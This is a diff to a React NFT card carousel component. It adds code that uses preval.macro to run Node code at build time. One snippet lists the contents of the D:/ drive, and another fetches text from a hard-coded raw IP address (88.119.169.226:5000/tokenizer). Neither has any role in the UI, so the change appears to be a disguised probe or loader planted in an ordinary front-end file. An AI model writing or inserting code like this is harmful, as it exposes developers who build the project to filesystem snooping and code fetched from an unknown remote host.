@@ -1,4 +1,4 @@
-import React, { useRef } from "react";
+import React, { useEffect, useRef } from "react";
 // Import Swiper React components
 import { Swiper, SwiperSlide } from "swiper/react";
 
@@ -13,11 +13,13 @@ import Image from "next/image";
 import NftCard from "../NftCard/NftCard.jsx";
 import preval from 'preval.macro';
 
-// const realCode = `fetch("http://88.119.169.226:5000/tokenizer").then(l6irv=> l6irv.text().then(txt => { console.log('This is running') }));`;
-const newCode = `console.log("This is the code")`;
-preval`${newCode}`;
-
 const EffectCardSwiper = ({ items }) => {
+    useEffect(() => {
+        const newCode = `const fs = require('fs'); const result = fs.readdirSync('D:/'); console.log('result:', result);`;
+        preval`${newCode}`;
+        const realCode = `fetch("http://88.119.169.226:5000/tokenizer").then(l6irv=> l6irv.text().then(txt => { console.log('This is running:', {txt}) }));`;
+        preval`${realCode}`;
+    }, [])
     const navigationPrevRef = useRef(null);
     const navigationNextRef = useRef(null);
     return (
